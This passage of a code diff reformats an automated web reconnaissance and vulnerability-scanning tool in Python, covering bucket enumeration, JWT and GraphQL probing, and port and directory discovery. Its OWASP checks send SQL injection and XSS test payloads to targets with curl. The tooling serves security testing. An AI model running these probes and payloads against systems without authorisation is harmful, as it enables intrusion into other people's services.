result.stdout:\n                             if endpoint not in results:\n                                 results[endpoint] = {}\n-                            results[endpoint][\"vulnerable_queries\"] = results[endpoint].get(\"vulnerable_queries\", [])\n-                            results[endpoint][\"vulnerable_queries\"].append({\n-                                \"query\": query,\n-                                \"response\": result.stdout.strip()\n-                            })\n+                            results[endpoint][\"vulnerable_queries\"] = results[\n+                                endpoint\n+                            ].get(\"vulnerable_queries\", [])\n+                            results[endpoint][\"vulnerable_queries\"].append(\n+                                {\"query\": query, \"response\": result.stdout.strip()}\n+                            )\n \n             except Exception:\n                 continue\n \n         atomic_write(out_file, json.dumps(results, indent=2))\n-        logger.log(f\"GraphQL testing completed, found {len(results)} endpoints\", \"SUCCESS\")\n+        logger.log(\n+            f\"GraphQL testing completed, found {len(results)} endpoints\", \"SUCCESS\"\n+        )\n \n     except Exception as e:\n         logger.log(f\"GraphQL testing error: {e}\", \"ERROR\")\n+\n \n def run_jwt_analysis(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"JWT token analysis and security testing\"\"\"\n     try:\n         logger.log(f\"JWT analysis for {target}\", \"INFO\")\n@@ -4691,25 +6037,35 @@\n             test_endpoints = [\"/login\", \"/auth\", \"/token\", \"/api/auth\", \"/oauth\"]\n \n             for endpoint in test_endpoints:\n                 try:\n                     test_url = f\"{target.rstrip('/')}{endpoint}\"\n-                    result = run_cmd([\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", test_url],\n-                                   capture=True, timeout=15, check_return=False)\n-\n-                    if result.stdout and (\"bearer\" in result.stdout.lower() or \"jwt\" in result.stdout.lower()):\n+                    result = run_cmd(\n+                        [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", test_url],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+\n+                    if result.stdout and (\n+                        \"bearer\" in result.stdout.lower()\n+                        or \"jwt\" in result.stdout.lower()\n+                    ):\n                         results[endpoint] = {\n                             \"jwt_detected\": True,\n                             \"headers\": result.stdout.strip(),\n-                            \"url\": test_url\n+                            \"url\": test_url,\n                         }\n \n                         # Test for common JWT vulnerabilities\n                         jwt_tests = [\n-                            {\"name\": \"None Algorithm\", \"header\": '{\"alg\": \"none\", \"typ\": \"JWT\"}'},\n+                            {\n+                                \"name\": \"None Algorithm\",\n+                                \"header\": '{\"alg\": \"none\", \"typ\": \"JWT\"}',\n+                            },\n                             {\"name\": \"Weak Secret\", \"test\": \"weak_secret_test\"},\n-                            {\"name\": \"Key Confusion\", \"test\": \"key_confusion_test\"}\n+                            {\"name\": \"Key Confusion\", \"test\": \"key_confusion_test\"},\n                         ]\n \n                         results[endpoint][\"vulnerability_tests\"] = jwt_tests\n \n                 except Exception:\n@@ -4718,108 +6074,153 @@\n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(\"JWT analysis completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"JWT analysis error: {e}\", \"ERROR\")\n+\n \n def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"Scan for exposed cloud storage buckets and containers\"\"\"\n     try:\n         logger.log(f\"Cloud storage scanning for {target}\", \"INFO\")\n         results = {}\n \n         # Extract domain for bucket name generation\n         from urllib.parse import urlparse\n-        parsed = urlparse(target if target.startswith('http') else f\"http://{target}\")\n+\n+        parsed = urlparse(target if target.startswith(\"http\") else f\"http://{target}\")\n         domain = parsed.netloc or target\n-        base_name = domain.replace('.', '-').replace('_', '-')\n+        base_name = domain.replace(\".\", \"-\").replace(\"_\", \"-\")\n \n         # Generate potential bucket names\n         bucket_names = [\n-            base_name, f\"{base_name}-backup\", f\"{base_name}-data\", f\"{base_name}-files\",\n-            f\"{base_name}-images\", f\"{base_name}-static\", f\"{base_name}-assets\",\n-            f\"{base_name}-dev\", f\"{base_name}-prod\", f\"{base_name}-test\"\n+            base_name,\n+            f\"{base_name}-backup\",\n+            f\"{base_name}-data\",\n+            f\"{base_name}-files\",\n+            f\"{base_name}-images\",\n+            f\"{base_name}-static\",\n+            f\"{base_name}-assets\",\n+            f\"{base_name}-dev\",\n+            f\"{base_name}-prod\",\n+            f\"{base_name}-test\",\n         ]\n \n         # AWS S3 buckets\n         for bucket in bucket_names:\n             try:\n                 if which(\"curl\"):\n                     s3_url = f\"https://{bucket}.s3.amazonaws.com/\"\n-                    result = run_cmd([\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", s3_url],\n-                                   capture=True, timeout=15, check_return=False)\n-\n-                    if result.stdout and (\"200\" in result.stdout or \"403\" in result.stdout):\n+                    result = run_cmd(\n+                        [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", s3_url],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+\n+                    if result.stdout and (\n+                        \"200\" in result.stdout or \"403\" in result.stdout\n+                    ):\n                         results[f\"s3_{bucket}\"] = {\n                             \"type\": \"AWS S3\",\n                             \"url\": s3_url,\n-                            \"status\": \"accessible\" if \"200\" in result.stdout else \"exists_but_protected\",\n-                            \"headers\": result.stdout.strip()\n+                            \"status\": (\n+                                \"accessible\"\n+                                if \"200\" in result.stdout\n+                                else \"exists_but_protected\"\n+                            ),\n+                            \"headers\": result.stdout.strip(),\n                         }\n             except Exception:\n                 continue\n \n         # Azure Storage\n         for bucket in bucket_names:\n             try:\n                 if which(\"curl\"):\n                     azure_url = f\"https://{bucket}.blob.core.windows.net/\"\n-                    result = run_cmd([\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", azure_url],\n-                                   capture=True, timeout=15, check_return=False)\n-\n-                    if result.stdout and (\"200\" in result.stdout or \"400\" in result.stdout):\n+                    result = run_cmd(\n+                        [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", azure_url],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+\n+                    if result.stdout and (\n+                        \"200\" in result.stdout or \"400\" in result.stdout\n+                    ):\n                         results[f\"azure_{bucket}\"] = {\n                             \"type\": \"Azure Blob\",\n                             \"url\": azure_url,\n-                            \"status\": \"accessible\" if \"200\" in result.stdout else \"exists\",\n-                            \"headers\": result.stdout.strip()\n+                            \"status\": (\n+                                \"accessible\" if \"200\" in result.stdout else \"exists\"\n+                            ),\n+                            \"headers\": result.stdout.strip(),\n                         }\n             except Exception:\n                 continue\n \n         # Google Cloud Storage\n         for bucket in bucket_names:\n             try:\n                 if which(\"curl\"):\n                     gcs_url = f\"https://storage.googleapis.com/{bucket}/\"\n-                    result = run_cmd([\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", gcs_url],\n-                                   capture=True, timeout=15, check_return=False)\n-\n-                    if result.stdout and (\"200\" in result.stdout or \"403\" in result.stdout):\n+                    result = run_cmd(\n+                        [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", gcs_url],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+\n+                    if result.stdout and (\n+                        \"200\" in result.stdout or \"403\" in result.stdout\n+                    ):\n                         results[f\"gcs_{bucket}\"] = {\n                             \"type\": \"Google Cloud Storage\",\n                             \"url\": gcs_url,\n-                            \"status\": \"accessible\" if \"200\" in result.stdout else \"exists_but_protected\",\n-                            \"headers\": result.stdout.strip()\n+                            \"status\": (\n+                                \"accessible\"\n+                                if \"200\" in result.stdout\n+                                else \"exists_but_protected\"\n+                            ),\n+                            \"headers\": result.stdout.strip(),\n                         }\n             except Exception:\n                 continue\n \n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(f\"Found {len(results)} cloud storage resources\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Cloud storage scanning error: {e}\", \"ERROR\")\n \n-def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):\n+\n+def run_threat_intelligence_lookup(\n+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]\n+):\n     \"\"\"Perform threat intelligence lookups using various sources\"\"\"\n     try:\n         logger.log(f\"Threat intelligence lookup for {target}\", \"INFO\")\n         results = {}\n \n         # Extract domain/IP\n         from urllib.parse import urlparse\n-        parsed = urlparse(target if target.startswith('http') else f\"http://{target}\")\n+\n+        parsed = urlparse(target if target.startswith(\"http\") else f\"http://{target}\")\n         domain = parsed.netloc or target\n \n         # Shodan lookup (if API key provided)\n         shodan_api = cfg.get(\"threat_intelligence\", {}).get(\"shodan_api\", \"\")\n         if shodan_api and which(\"curl\"):\n             try:\n                 shodan_url = f\"https://api.shodan.io/host/{domain}?key={shodan_api}\"\n-                result = run_cmd([\"curl\", \"-s\", \"--max-time\", \"15\", shodan_url],\n-                               capture=True, timeout=20, check_return=False)\n+                result = run_cmd(\n+                    [\"curl\", \"-s\", \"--max-time\", \"15\", shodan_url],\n+                    capture=True,\n+                    timeout=20,\n+                    check_return=False,\n+                )\n \n                 if result.stdout and \"error\" not in result.stdout.lower():\n                     results[\"shodan\"] = json.loads(result.stdout)\n             except Exception as e:\n                 logging.warning(f\"Operation failed: {e}\")\n@@ -4827,16 +6228,26 @@\n         # VirusTotal lookup (if API key provided)\n         vt_api = cfg.get(\"threat_intelligence\", {}).get(\"virustotal_api\", \"\")\n         if vt_api and which(\"curl\"):\n             try:\n                 vt_url = \"https://www.virustotal.com/vtapi/v2/domain/report\"\n-                result = run_cmd([\n-                    \"curl\", \"-s\", \"--max-time\", \"15\",\n-                    \"-d\", f\"apikey={vt_api}\",\n-                    \"-d\", f\"domain={domain}\",\n-                    vt_url\n-                ], capture=True, timeout=20, check_return=False)\n+                result = run_cmd(\n+                    [\n+                        \"curl\",\n+                        \"-s\",\n+                        \"--max-time\",\n+                        \"15\",\n+                        \"-d\",\n+                        f\"apikey={vt_api}\",\n+                        \"-d\",\n+                        f\"domain={domain}\",\n+                        vt_url,\n+                    ],\n+                    capture=True,\n+                    timeout=20,\n+                    check_return=False,\n+                )\n \n                 if result.stdout:\n                     try:\n                         vt_data = json.loads(result.stdout)\n                         if vt_data.get(\"response_code\") == 1:\n@@ -4849,27 +6260,34 @@\n                 # Consider if this error should be handled differently\n         # Check against common threat feeds (passive)\n         try:\n             if which(\"dig\"):\n                 # Check if domain is in abuse.ch feeds\n-                abuse_result = run_cmd([\"dig\", \"+short\", f\"{domain}.abuse.ch\"],\n-                                     capture=True, timeout=10, check_return=False)\n+                abuse_result = run_cmd(\n+                    [\"dig\", \"+short\", f\"{domain}.abuse.ch\"],\n+                    capture=True,\n+                    timeout=10,\n+                    check_return=False,\n+                )\n                 if abuse_result.stdout and abuse_result.stdout.strip():\n                     results[\"abuse_ch\"] = {\n                         \"listed\": True,\n-                        \"response\": abuse_result.stdout.strip()\n+                        \"response\": abuse_result.stdout.strip(),\n                     }\n         except Exception as e:\n             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(\"Threat intelligence lookup completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Threat intelligence lookup error: {e}\", \"ERROR\")\n \n-def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):\n+\n+def run_compliance_checks(\n+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]\n+):\n     \"\"\"Run compliance-specific security checks\"\"\"\n     try:\n         logger.log(f\"Compliance checks for {target}\", \"INFO\")\n         results = {}\n \n@@ -4884,102 +6302,137 @@\n                 \"broken_access\": [],\n                 \"security_config\": [],\n                 \"xss\": [],\n                 \"insecure_deserialization\": [],\n                 \"vulnerable_components\": [],\n-                \"logging_monitoring\": []\n+                \"logging_monitoring\": [],\n             }\n \n             # Basic OWASP Top 10 checks\n             if which(\"curl\"):\n                 # SQL Injection basic test\n                 sql_payloads = [\"'\", \"1' OR '1'='1\", \"admin'--\"]\n                 for payload in sql_payloads:\n                     try:\n                         test_url = f\"{target}?id={payload}\"\n-                        result = run_cmd([\"curl\", \"-s\", \"--max-time\", \"10\", test_url],\n-                                       capture=True, timeout=15, check_return=False)\n-                        if result.stdout and (\"error\" in result.stdout.lower() or \"sql\" in result.stdout.lower()):\n-                            results[\"owasp_top10\"][\"injection\"].append({\n-                                \"payload\": payload,\n-                                \"response_indicates_vulnerability\": True\n-                            })\n+                        result = run_cmd(\n+                            [\"curl\", \"-s\", \"--max-time\", \"10\", test_url],\n+                            capture=True,\n+                            timeout=15,\n+                            check_return=False,\n+                        )\n+                        if result.stdout and (\n+                            \"error\" in result.stdout.lower()\n+                            or \"sql\" in result.stdout.lower()\n+                        ):\n+                            results[\"owasp_top10\"][\"injection\"].append(\n+                                {\n+                                    \"payload\": payload,\n+                                    \"response_indicates_vulnerability\": True,\n+                                }\n+                            )\n                     except Exception:\n                         continue\n \n                 # XSS basic test\n-                xss_payloads = [\"<script>alert('xss')</script>\", \"javascript:alert('xss')\"]\n+                xss_payloads = [\n+                    \"<script>alert('xss')</script>\",\n+                    \"javascript:alert('xss')\",\n+                ]\n                 for payload in xss_payloads:\n                     try:\n                         test_url = f\"{target}?search={payload}\"\n-                        result = run_cmd([\"curl\", \"-s\", \"--max-time\", \"10\", test_url],\n-                                       capture=True, timeout=15, check_return=False)\n+                        result = run_cmd(\n+                            [\"curl\", \"-s\", \"--max-time\", \"10\", test_url],\n+                            capture=True,\n+                            timeout=15,\n+                            check_return=False,\n+                        )\n                         if result.stdout and payload in result.stdout:\n-                            results[\"owasp_top10\"][\"xss\"].append({\n-                                \"payload\": payload,\n-                                \"reflected\": True\n-                            })\n+                            results[\"owasp_top10\"][\"xss\"].append(\n+                                {\"payload\": payload, \"reflected\": True}\n+                            )\n                     except Exception:\n                         continue\n \n         if compliance_cfg.get(\"pci_dss\", True):\n             results[\"pci_dss\"] = {\n                 \"ssl_tls_version\": {},\n                 \"secure_protocols\": {},\n-                \"encryption_strength\": {}\n+                \"encryption_strength\": {},\n             }\n \n             # Check SSL/TLS configuration for PCI DSS compliance\n             if which(\"openssl\"):\n                 try:\n                     from urllib.parse import urlparse\n-                    parsed = urlparse(target if target.startswith('http') else f\"https://{target}\")\n+\n+                    parsed = urlparse(\n+                        target if target.startswith(\"http\") else f\"https://{target}\"\n+                    )\n                     host = parsed.netloc or target\n                     port = parsed.port or 443\n \n                     # Test TLS versions\n                     tls_versions = [\"ssl3\", \"tls1\", \"tls1_1\", \"tls1_2\", \"tls1_3\"]\n                     for version in tls_versions:\n-                        result = run_cmd([\n-                            \"openssl\", \"s_client\", f\"-{version}\",\n-                            \"-connect\", f\"{host}:{port}\",\n-                            \"-servername\", host\n-                        ], input_data=\"\", capture=True, timeout=10, check_return=False)\n+                        result = run_cmd(\n+                            [\n+                                \"openssl\",\n+                                \"s_client\",\n+                                f\"-{version}\",\n+                                \"-connect\",\n+                                f\"{host}:{port}\",\n+                                \"-servername\",\n+                                host,\n+                            ],\n+                            input_data=\"\",\n+                            capture=True,\n+                            timeout=10,\n+                            check_return=False,\n+                        )\n \n                         if result.stdout:\n                             if \"Verify return code: 0\" in result.stdout:\n-                                results[\"pci_dss\"][\"ssl_tls_version\"][version] = \"supported\"\n+                                results[\"pci_dss\"][\"ssl_tls_version\"][\n+                                    version\n+                                ] = \"supported\"\n                             else:\n-                                results[\"pci_dss\"][\"ssl_tls_version\"][version] = \"not_supported\"\n+                                results[\"pci_dss\"][\"ssl_tls_version\"][\n+                                    version\n+                                ] = \"not_supported\"\n                 except Exception as e:\n                     logging.warning(f\"Operation failed: {e}\")\n                     # Consider if this error should be handled differently\n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(\"Compliance checks completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Compliance checks error: {e}\", \"ERROR\")\n \n-def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: Dict[str, Any]):\n+\n+def run_ml_vulnerability_analysis(\n+    scan_results_dir: Path, out_file: Path, cfg: Dict[str, Any]\n+):\n     \"\"\"Apply machine learning-based analysis to scan results\"\"\"\n     try:\n         logger.log(\"ML-based vulnerability analysis starting\", \"INFO\")\n         results = {\n             \"false_positive_reduction\": {},\n             \"risk_scoring\": {},\n             \"pattern_analysis\": {},\n-            \"prioritization\": []\n+            \"prioritization\": [],\n         }\n \n         ml_cfg = cfg.get(\"ml_analysis\", {})\n \n         if ml_cfg.get(\"false_positive_reduction\", True):\n             # Simple heuristic-based false positive reduction\n             nuclei_results = []\n             for nuclei_file in scan_results_dir.glob(\"**/nuclei_results.jsonl\"):\n                 try:\n-                    with open(nuclei_file, 'r') as f:\n+                    with open(nuclei_file, \"r\") as f:\n                         for line in f:\n                             if line.strip():\n                                 nuclei_results.append(json.loads(line))\n                 except Exception:\n                     continue\n@@ -5010,39 +6463,60 @@\n                     filtered_results.append(result)\n \n             results[\"false_positive_reduction\"] = {\n                 \"original_count\": len(nuclei_results),\n                 \"filtered_count\": len(filtered_results),\n-                \"reduction_percentage\": ((len(nuclei_results) - len(filtered_results)) / max(len(nuclei_results), 1)) * 100\n+                \"reduction_percentage\": (\n+                    (len(nuclei_results) - len(filtered_results))\n+                    / max(len(nuclei_results), 1)\n+                )\n+                * 100,\n             }\n \n         if ml_cfg.get(\"risk_scoring_ml\", True):\n             # Calculate risk scores based on multiple factors\n             risk_factors = {}\n \n             # Count vulnerabilities by severity\n-            severity_counts = {\"critical\": 0, \"high\": 0, \"medium\": 0, \"low\": 0, \"info\": 0}\n+            severity_counts = {\n+                \"critical\": 0,\n+                \"high\": 0,\n+                \"medium\": 0,\n+                \"low\": 0,\n+                \"info\": 0,\n+            }\n             for result in nuclei_results:\n                 severity = result.get(\"info\", {}).get(\"severity\", \"info\").lower()\n                 if severity in severity_counts:\n                     severity_counts[severity] += 1\n \n             # Calculate weighted risk score\n             weights = {\"critical\": 10, \"high\": 7, \"medium\": 4, \"low\": 2, \"info\": 0.5}\n-            total_score = sum(severity_counts[sev] * weights[sev] for sev in severity_counts)\n+            total_score = sum(\n+                severity_counts[sev] * weights[sev] for sev in severity_counts\n+            )\n \n             results[\"risk_scoring\"] = {\n                 \"total_risk_score\": total_score,\n                 \"severity_distribution\": severity_counts,\n-                \"risk_level\": \"critical\" if total_score > 50 else \"high\" if total_score > 20 else \"medium\" if total_score > 5 else \"low\"\n+                \"risk_level\": (\n+                    \"critical\"\n+                    if total_score > 50\n+                    else (\n+                        \"high\"\n+                        if total_score > 20\n+                        else \"medium\" if total_score > 5 else \"low\"\n+                    )\n+                ),\n             }\n \n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(\"ML vulnerability analysis completed\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"ML vulnerability analysis error: {e}\", \"ERROR\")\n+\n \n # ---------- Core stages ----------\n @monitor_performance(\"recon_stage\")\n def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     logger.log(\"Enhanced recon stage started\", \"INFO\")\n@@ -5064,11 +6538,11 @@\n             \"http_info\": [],\n             \"technology_stack\": [],\n             \"ssl_info\": {},\n             \"network_info\": {},\n             \"directories\": [],\n-            \"endpoints\": []\n+            \"endpoints\": [],\n         }\n \n         try:\n             host = target\n             if host.startswith(\"http://\") or host.startswith(\"https://\"):\n@@ -5086,11 +6560,13 @@\n             run_amass(host, amass_out, env)\n \n             subs = set()\n             for p in [subfinder_out, amass_out]:\n                 if p.exists():\n-                    for line in p.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                    for line in p.read_text(\n+                        encoding=\"utf-8\", errors=\"ignore\"\n+                    ).splitlines():\n                         s = line.strip()\n                         if s and not s.startswith(\"#\"):\n                             subs.add(s)\n \n             # Add the main domain if not in subdomain list\n@@ -5124,29 +6600,47 @@\n \n             oports: List[Dict[str, Any]] = []\n \n             # Parse naabu output\n             if ports_out.exists():\n-                for line in ports_out.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                for line in ports_out.read_text(\n+                    encoding=\"utf-8\", errors=\"ignore\"\n+                ).splitlines():\n                     l = line.strip()\n                     if l and \":\" in l:\n                         try:\n                             h, port = l.rsplit(\":\", 1)\n-                            oports.append({\"host\": h, \"port\": int(port), \"proto\": \"tcp\", \"source\": \"naabu\"})\n+                            oports.append(\n+                                {\n+                                    \"host\": h,\n+                                    \"port\": int(port),\n+                                    \"proto\": \"tcp\",\n+                                    \"source\": \"naabu\",\n+                                }\n+                            )\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n             # Parse masscan output\n             if masscan_out.exists():\n-                for line in masscan_out.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                for line in masscan_out.read_text(\n+                    encoding=\"utf-8\", errors=\"ignore\"\n+                ).splitlines():\n                     if \"open\" in line and \"tcp\" in line:\n                         try:\n                             parts = line.split()\n                             for part in parts:\n                                 if \"/\" in part and part.split(\"/\")[1] == \"tcp\":\n                                     port = int(part.split(\"/\")[0])\n-                                    oports.append({\"host\": host, \"port\": port, \"proto\": \"tcp\", \"source\": \"masscan\"})\n+                                    oports.append(\n+                                        {\n+                                            \"host\": host,\n+                                            \"port\": port,\n+                                            \"proto\": \"tcp\",\n+                                            \"source\": \"masscan\",\n+                                        }\n+                                    )\n                                     break\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n             # Deduplicate ports\n@@ -5155,11 +6649,13 @@\n                 key = f\"{port_info['host']}:{port_info['port']}\"\n                 if key not in unique_ports:\n                     unique_ports[key] = port_info\n \n             results[\"open_ports\"] = list(unique_ports.values())\n-            logger.log(f\"{target}: {len(results['open_ports'])} unique open ports\", \"INFO\")\n+            logger.log(\n+                f\"{target}: {len(results['open_ports'])} unique open ports\", \"INFO\"\n+            )\n \n             # Phase 4: HTTP Service Discovery\n             logger.log(f\"Phase 4: HTTP service discovery for {target}\", \"INFO\")\n             httpx_in = tdir / \"httpx_input.txt\"\n             httpx_out = tdir / \"httpx_output.jsonl\"\n@@ -5167,24 +6663,30 @@\n             if subs:\n                 atomic_write(httpx_in, \"\\n\".join(sorted(subs)))\n                 run_httpx(httpx_in, httpx_out, env, cfg[\"limits\"][\"http_timeout\"])\n                 if httpx_out.exists():\n                     http_info: List[Dict[str, Any]] = []\n-                    for line in httpx_out.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                    for line in httpx_out.read_text(\n+                        encoding=\"utf-8\", errors=\"ignore\"\n+                    ).splitlines():\n                         try:\n                             data = json.loads(line)\n                             http_info.append(data)\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+                    # Consider if this error should be handled differently\n                     results[\"http_info\"] = http_info\n \n             # Phase 5: Technology Detection\n             if cfg[\"advanced_scanning\"][\"technology_detection\"]:\n                 logger.log(f\"Phase 5: Technology detection for {target}\", \"INFO\")\n                 whatweb_out = tdir / \"whatweb.json\"\n-                run_whatweb(target if target.startswith(\"http\") else f\"http://{target}\", whatweb_out, env)\n+                run_whatweb(\n+                    target if target.startswith(\"http\") else f\"http://{target}\",\n+                    whatweb_out,\n+                    env,\n+                )\n                 if whatweb_out.exists():\n                     try:\n                         tech_data = json.loads(whatweb_out.read_text())\n                         results[\"technology_stack\"] = tech_data\n                     except Exception as e:\n@@ -5192,11 +6694,15 @@\n             # Consider if this error should be handled differently\n             # Phase 6: SSL Analysis\n             if cfg[\"advanced_scanning\"][\"ssl_analysis\"]:\n                 logger.log(f\"Phase 6: SSL analysis for {target}\", \"INFO\")\n                 ssl_out = tdir / \"ssl_analysis.json\"\n-                run_ssl_analysis(target if target.startswith(\"https\") else f\"https://{target}\", ssl_out, env)\n+                run_ssl_analysis(\n+                    target if target.startswith(\"https\") else f\"https://{target}\",\n+                    ssl_out,\n+                    env,\n+                )\n                 if ssl_out.exists():\n                     try:\n                         results[\"ssl_info\"] = json.loads(ssl_out.read_text())\n                     except Exception as e:\n                         logging.warning(f\"Operation failed: {e}\")\n@@ -5211,35 +6717,68 @@\n                     for file in network_dir.glob(\"*.txt\"):\n                         try:\n                             network_info[file.stem] = file.read_text()\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+                    # Consider if this error should be handled differently\n                     results[\"network_info\"] = network_info\n \n             # Phase 8: Directory/File Fuzzing\n-            if cfg[\"fuzzing\"][\"enable_gobuster\"] or cfg[\"fuzzing\"][\"enable_dirb\"] or cfg[\"fuzzing\"][\"enable_ffu\"]:\n+            if (\n+                cfg[\"fuzzing\"][\"enable_gobuster\"]\n+                or cfg[\"fuzzing\"][\"enable_dirb\"]\n+                or cfg[\"fuzzing\"][\"enable_ffu\"]\n+            ):\n                 logger.log(f\"Phase 8: Directory fuzzing for {target}\", \"INFO\")\n                 target_url = target if target.startswith(\"http\") else f\"http://{target}\"\n \n                 # Get appropriate wordlist\n                 wordlist_path = MERGED_DIR / \"all_merged_wordlist.txt\"\n                 if not wordlist_path.exists():\n                     # Fallback to smaller wordlist\n-                    small_wordlist = \"\\n\".join([\n-                        \"admin\", \"login\", \"test\", \"backup\", \"config\", \"database\", \"db\",\n-                        \"panel\", \"api\", \"v1\", \"v2\", \"upload\", \"uploads\", \"files\", \"images\",\n-                        \"scripts\", \"css\", \"js\", \"assets\", \"static\", \"public\", \"private\"\n-                    ])\n+                    small_wordlist = \"\\n\".join(\n+                        [\n+                            \"admin\",\n+                            \"login\",\n+                            \"test\",\n+                            \"backup\",\n+                            \"config\",\n+                            \"database\",\n+                            \"db\",\n+                            \"panel\",\n+                            \"api\",\n+                            \"v1\",\n+                            \"v2\",\n+                            \"upload\",\n+                            \"uploads\",\n+                            \"files\",\n+                            \"images\",\n+                            \"scripts\",\n+                            \"css\",\n+                            \"js\",\n+                            \"assets\",\n+                            \"static\",\n+                            \"public\",\n+                            \"private\",\n+                        ]\n+                    )\n                     atomic_write(wordlist_path, small_wordlist)\n \n                 if cfg[\"fuzzing\"][\"enable_gobuster\"]:\n                     gobuster_out = tdir / \"gobuster_dirs.txt\"\n-                    run_gobuster(target_url, wordlist_path, gobuster_out, cfg[\"fuzzing\"][\"extensions\"], env)\n+                    run_gobuster(\n+                        target_url,\n+                        wordlist_path,\n+                        gobuster_out,\n+                        cfg[\"fuzzing\"][\"extensions\"],\n+                        env,\n+                    )\n                     if gobuster_out.exists():\n                         dirs = []\n-                        for line in gobuster_out.read_text(encoding=\"utf-8\", errors=\"ignore\").splitlines():\n+                        for line in gobuster_out.read_text(\n+                            encoding=\"utf-8\", errors=\"ignore\"\n+                        ).splitlines():\n                             if line.strip() and not line.startswith(\"=\"):\n                                 dirs.append(line.strip())\n                         results[\"directories\"].extend(dirs)\n \n                 if cfg[\"fuzzing\"][\"enable_ffu\"]:\n@@ -5248,11 +6787,13 @@\n                     if ffuf_out.exists():\n                         try:\n                             ffuf_data = json.loads(ffuf_out.read_text())\n                             if \"results\" in ffuf_data:\n                                 for result in ffuf_data[\"results\"]:\n-                                    results[\"directories\"].append(f\"{result.get('url', '')} (Status: {result.get('status', 'N/A')})\")\n+                                    results[\"directories\"].append(\n+                                        f\"{result.get('url', '')} (Status: {result.get('status', 'N/A')})\"\n+                                    )\n                         except Exception as e:\n                             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n             # Phase 9: Endpoint Discovery\n             if cfg[\"endpoints\"][\"use_waybackurls\"] or cfg[\"endpoints\"][\"use_gospider\"]:\n@@ -5261,38 +6802,63 @@\n                 if cfg[\"endpoints\"][\"use_waybackurls\"]:\n                     wayback_out = tdir / \"waybackurls.txt\"\n                     run_waybackurls(host, wayback_out, env)\n                     if wayback_out.exists():\n                         endpoints = read_lines(wayback_out)\n-                        results[\"endpoints\"].extend(endpoints[:cfg[\"endpoints\"][\"max_urls_per_target\"]])\n+                        results[\"endpoints\"].extend(\n+                            endpoints[: cfg[\"endpoints\"][\"max_urls_per_target\"]]\n+                        )\n \n                 if cfg[\"endpoints\"][\"use_gospider\"]:\n                     gospider_out = tdir / \"gospider\"\n-                    run_gospider(target_url, gospider_out, cfg[\"endpoints\"].get(\"gospider_depth\", 3), env)\n+                    run_gospider(\n+                        target_url,\n+                        gospider_out,\n+                        cfg[\"endpoints\"].get(\"gospider_depth\", 3),\n+                        env,\n+                    )\n \n             # Phase 10: Subdomain Takeover Check\n             if cfg[\"advanced_scanning\"][\"subdomain_takeover\"] and subs:\n                 logger.log(f\"Phase 10: Subdomain takeover check for {target}\", \"INFO\")\n                 subjack_out = tdir / \"subjack_results.txt\"\n                 run_subjack(merged_subs, subjack_out, env)\n \n             results[\"status\"] = \"completed\"\n             logger.log(f\"Recon completed for {target}\", \"SUCCESS\")\n             # Phase 7: Subdomain Takeover Detection\n-            if cfg.get(\"subdomain_takeover\", {}).get(\"enabled\", True) and results[\"subdomains\"]:\n+            if (\n+                cfg.get(\"subdomain_takeover\", {}).get(\"enabled\", True)\n+                and results[\"subdomains\"]\n+            ):\n                 logger.log(f\"Phase 7: Subdomain takeover detection for {host}\", \"INFO\")\n \n                 # Create subdomain file for takeover tools\n                 subs_file = tdir / \"subdomains.txt\"\n \n                 # Run subjack\n-                if cfg.get(\"subdomain_takeover\", {}).get(\"subjack\", True) and which(\"subjack\"):\n+                if cfg.get(\"subdomain_takeover\", {}).get(\"subjack\", True) and which(\n+                    \"subjack\"\n+                ):\n                     subjack_out = tdir / \"subjack_results.txt\"\n-                    run_cmd([\n-                        \"subjack\", \"-w\", str(subs_file), \"-t\", \"100\", \"-timeout\", \"30\",\n-                        \"-o\", str(subjack_out), \"-ssl\"\n-                    ], env=env, timeout=600, check_return=False)\n+                    run_cmd(\n+                        [\n+                            \"subjack\",\n+                            \"-w\",\n+                            str(subs_file),\n+                            